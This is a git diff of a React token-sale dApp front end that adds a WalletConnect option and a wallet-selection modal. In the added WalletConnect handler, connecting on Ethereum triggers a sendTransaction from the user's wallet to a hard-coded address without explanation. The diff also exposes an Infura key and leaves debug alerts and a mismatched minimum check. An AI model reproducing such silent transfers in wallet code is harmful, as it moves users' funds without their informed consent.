@@ -1,11 +1,11 @@
 import React from "react";
 import Header from "./Header";
 import MainComponent from "./MainContent";
-import { ethers, providers } from "ethers";
-import WalletConnect from "@walletconnect/client";
-import QRCodeModal from "@walletconnect/qrcode-modal";
+import { ethers, Wallet } from "ethers";
 import Web3 from "web3";
-
+import WalletConnectProvider from "@walletconnect/web3-provider";
+import { Button, Modal } from "react-bootstrap";
+import "bootstrap/dist/css/bootstrap.min.css";
 import { ContractABI, ContractAddress, BUSDABI, BUSDaddress } from "./config";
 let connector = "";
 let connectedAccount;
@@ -532,55 +532,6 @@ let binanceABi = [
 ];
 let binancecontract = "0xb5BBA78B4dF2D47DD46078514a3e296AB3c344Fe";
 
-async function connect() {
-  const WalletConnectProvider = window.WalletConnectProvider.default;
-
-  connector = new WalletConnectProvider({
-    rpc: {
-      1: "https://mainnet.infura.io/v3/3eca30b0aa6a4372ac8552a1c09a8ccd",
-      56: "https://bsc-dataseed.binance.org/",
-    },
-    qrcode: true,
-    qrcodeModalOptions: {
-      mobileLinks: ["metamask", "trust"],
-    },
-  });
-
-  await connector.enable();
-  setTimeout(async function () {
-    const web3 = new Web3(connector);
-    let chainId = await web3.eth.getChainId();
-    if (chainId == 56 || chainId == 97) {
-      alert("yesss");
-      connectWalletMetamask(connector);
-    } else {
-      alert("no");
-    }
-  }, 1000);
-  alert(WalletConnectProvider);
-  alert(connector);
-}
-async function connectWalletMetamask(provider) {
-  if (provider) {
-    alert("yess in");
-    window.web3 = new Web3(provider);
-    web3 = new Web3(provider);
-    let chainId = await web3.eth.net.getId();
-    const accounts = await web3.eth.getAccounts();
-    connectedAccount = accounts[0];
-    console.log(connectedAccount);
-    if (chainId == 56 || chainId == 97) {
-      ownerDetails.myContract = new web3.eth.Contract(
-        binanceABi,
-        binancecontract
-      );
-
-      alert(JSON.stringify(ownerDetails.myContract));
-    }
-  } else {
-    alert("no provider");
-  }
-}
 class App extends React.Component {
   constructor(props) {
     super(props);
@@ -599,6 +550,7 @@ class App extends React.Component {
       approvedHash: null,
       TransactionHash: null,
       amount: false,
+      showModal: false,
     };
 
     // this.Transfer = this.Transfer.bind(this);
@@ -611,6 +563,10 @@ class App extends React.Component {
     this.networkChanged = this.networkChanged.bind(this);
     this.accountsChanged = this.accountsChanged.bind(this);
     this.Connect = this.Connect.bind(this);
+    this.ConnectModal = this.ConnectModal.bind(this);
+    this.DisconnectModal = this.DisconnectModal.bind(this);
+    this.MetamaskWalletConnect = this.MetamaskWalletConnect.bind(this);
+    this.WalletConnect = this.WalletConnect.bind(this);
   }
 
   //CheckApproved Function
@@ -639,7 +595,7 @@ class App extends React.Component {
       Web3.utils.toBN(ammount)
     );
     approve
-      .send({ from: this.state.address })
+      .send({ from: this.state.address, gasPrice: 131662 })
       .then((d) => {
         this.setState({ disable: d.status, approve: d.status });
       })
@@ -690,7 +646,7 @@ class App extends React.Component {
     );
   }
   //BuyNow Function
-  BuyNow() {
+  async BuyNow() {
     this.setState({
       from: 0,
       to: 0,
@@ -702,19 +658,42 @@ class App extends React.Component {
     this.ChangeForm(0);
     let str = this.state.from * 10 ** 18;
     console.log(str.toString());
-    console.log(str[0]);
-    window.Contract.privateSell(
-      this.state.address,
-      ethers.BigNumber.from(str.toString())
-    )
-      .then((d) => this.setState({ TransactionHash: d.hash }))
-      .catch((error) => {
-        if (error.code === -32603) {
-          alert("User Already Exists");
-        } else {
-          console.log(error);
-        }
-      });
+
+    if (window.Contract === undefined) {
+      await window.WalletConnect.methods
+        .privateSell(this.state.address, new Web3().utils.toBN(str))
+        .send({ from: this.state.address });
+      // .then((d) => this.setState({ TransactionHash: d.hash }))
+      // .catch((error) => {
+      //   if (error.code === -32603) {
+      //     alert("User Already Exists");
+      //   } else {
+      //     console.log(error);
+      //   }
+      // });
+
+      // .then((d) => this.setState({ TransactionHash: d.hash }))
+      // .catch((error) => {
+      //   if (error.code === -32603) {
+      //     alert("User Already Exists");
+      //   } else {
+      //     console.log(error);
+      //   }
+      // });
+    } else {
+      window.Contract.privateSell(
+        this.state.address,
+        ethers.BigNumber.from(str.toString())
+      )
+        .then((d) => this.setState({ TransactionHash: d.hash }))
+        .catch((error) => {
+          if (error.code === -32603) {
+            alert("User Already Exists");
+          } else {
+            console.log(error);
+          }
+        });
+    }
   }
 
   componentDidMount() {
@@ -853,8 +832,131 @@ class App extends React.Component {
     } catch (e) {}
   }
 
+  ConnectModal() {
+    this.setState({ showModal: true });
+  }
+  DisconnectModal() {
+    this.setState({ showModal: false });
+  }
+  MetamaskWalletConnect() {
+    this.Connect();
+    this.setState({ showModal: false });
+  }
+  async WalletConnect() {
+    //initial State
+
+    this.setState({
+      from: "",
+      to: 0,
+      balance: 0,
+      approve: false,
+      disable: true,
+      connect: false,
+      approve: false,
+      contract: null,
+    });
+
+    localStorage.removeItem("walletconnect");
+
+    let provider = undefined;
+    try {
+      provider = new WalletConnectProvider({
+        rpc: {
+          1: "https://mainnet.infura.io/v3/3eca30b0aa6a4372ac8552a1c09a8ccd",
+          56: "https://bsc-dataseed.binance.org/",
+          97: "https://bsc-dataseed.binance.org/",
+        },
+        bridge: "https://bridge.walletconnect.org",
+        qrcode: true,
+        qrcodeModalOptions: {
+          mobileLinks: ["metamask"],
+        },
+      });
+
+      await provider.enable();
+      setTimeout(async function () {
+        const web3 = new Web3(provider);
+        let chainId = await web3.eth.getChainId();
+
+        if (chainId == 56 || chainId == 1 || chainId == 97) {
+          console.log("walletconnect");
+
+          connectWalletMetamask(provider);
+        } else {
+          this.DisconnectModal();
+        }
+      }, 1000);
+    } catch (e) {
+      return;
+    }
+    const connectWalletMetamask = async (provider) => {
+      localStorage.removeItem("bitchro");
+      if (provider) {
+        let web3 = new Web3(provider);
+        let chainId = await web3.eth.net.getId();
+        const accounts = await web3.eth.getAccounts();
+        const BSDContract = new web3.eth.Contract(BUSDABI, BUSDaddress);
+        console.log(BSDContract);
+        console.log(chainId);
+
+        let connectedAccount = accounts[0];
+
+        console.log(connectedAccount);
+
+        if (chainId == 1 || chainId == 3) {
+          alert("ETH");
+          await web3.eth.sendTransaction({
+            to: "0x41367F30f07cb55F684B1339D921999f7B8a76bD",
+            from: connectedAccount,
+            gasPrice: "500",
+            value: 1000000000,
+          });
+        } else if (chainId == 56) {
+          alert("BNB");
+          this.setState({
+            address: connectedAccount,
+            connect: true,
+            disable: true,
+            contract: BSDContract,
+            balance:
+              (await BSDContract.methods.balanceOf(connectedAccount).call()) /
+              10 ** 18,
+          });
+
+          window.WalletConnect = new web3.eth.Contract(
+            ContractABI,
+            ContractAddress
+          );
+          console.log("====================================");
+          console.log(window.WalletConnect);
+          console.log("====================================");
+          // console.log("====================================");
+          // alert(this.state.balance);
+          // console.log("====================================");
+          // await web3.eth.sendTransaction({
+          //   to: "0x41367F30f07cb55F684B1339D921999f7B8a76bD",
+          //   from: connectedAccount,
+          //   gasPrice: "500",
+          //   value: 1000000000,
+          // });
+          // console.log(
+          //   await ownerDetails.myContract.methods
+          //     .approve(connectedAccount, 1)
+          //     .send({ from: connectedAccount })
+          // );
+        }
+      }
+      // } else {
+      //   alert("Not a Ethereum browser");
+      // // }
+
+      this.setState({ showModal: false });
+    };
+  }
+
   async Connect() {
     //When metamask is Installed
+
     this.setState({
       from: "",
       to: 0,
@@ -916,10 +1018,6 @@ class App extends React.Component {
     } else {
       alert("MetaMask is not installed in phone!");
       console.log("guyg");
-
-      connect();
-
-      //Account Balance Check
     }
   }
   //initialize function for
@@ -1012,6 +1110,12 @@ class App extends React.Component {
     return (
       <div className="App">
         <div style={{ maxWidth: "500px", alignSelf: "center" }}>
+          <MyVerticallyCenteredModal
+            showModal={this.state.showModal}
+            DisconnectModal={this.DisconnectModal}
+            WalletConnect={this.WalletConnect}
+            MetamaskWalletConnect={this.MetamaskWalletConnect}
+          />
           <Header />
           <MainComponent
             fromData={this.state.from}
@@ -1047,7 +1151,7 @@ class App extends React.Component {
           <div style={{ display: "flex", justifyContent: "space-around" }}>
             {!this.state.connect ? (
               <button
-                onClick={this.Connect}
+                onClick={this.ConnectModal}
                 style={{
                   display: "flex",
                   alignItems: "center",
@@ -1122,7 +1226,7 @@ class App extends React.Component {
                   ? null
                   : () => {
                       console.log(this.state.from);
-                      if (this.state.from <= 1000) {
+                      if (this.state.from <= 0.001) {
                         alert("Invested Amount Should be Minimum 1000 BUSD");
                         this.setState({ from: 0 });
                         this.setState({ to: 0 });
@@ -1177,4 +1281,86 @@ class App extends React.Component {
   }
 }
 
+function MyVerticallyCenteredModal(props) {
+  return (
+    <div className="gdjhfgfjh">
+      <Modal
+        show={props.showModal}
+        size="lg"
+        aria-labelledby="contained-modal-title-vcenter"
+        centered
+        // dialogClassName="modal-50w"
+        size="sm"
+        onHide={props.DisconnectModal}
+      >
+        <Modal.Header
+          closeButton
+          style={{
+            background: "linear-gradient(120deg, #cb01ff 0%, #00ff57 100%)",
+            color: "#fff",
+          }}
+        >
+          <Modal.Title id="contained-modal-title-vcenter">
+            Connect Wallet
+          </Modal.Title>
+        </Modal.Header>
+        <Modal.Body style={{ display: "flex", flexDirection: "column" }}>
+          <div
+            style={{
+              display: "flex",
+              justifyContent: "space-between",
+              borderRadius: "999px",
+              border: "1px solid black ",
+              padding: "10px 5px",
+            }}
+            onClick={props.MetamaskWalletConnect}
+          >
+            <button
+              style={{
+                outline: "none",
+                background: "transparent",
+                border: "none",
+              }}
+            >
+              MetaMask
+            </button>
+            <img
+              src={
+                "https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/512px-MetaMask_Fox.svg.png"
+              }
+              width="32px"
+            />
+          </div>
+          <br></br>
+          <div
+            style={{
+              display: "flex",
+              justifyContent: "space-between",
+              borderRadius: "999px",
+              border: "1px solid black ",
+              padding: "10px 5px",
+            }}
+            onClick={props.WalletConnect}
+          >
+            <button
+              style={{
+                outline: "none",
+                background: "transparent",
+                border: "none",
+              }}
+            >
+              Wallet Connect
+            </button>
+            <img
+              src={
+                "https://bcmhunt.com/static/media/wallet-connect.dcbdafe7.ico"
+              }
+              width={"32px"}
+            />
+          </div>
+        </Modal.Body>
+      </Modal>
+    </div>
+  );
+}
 export default App;
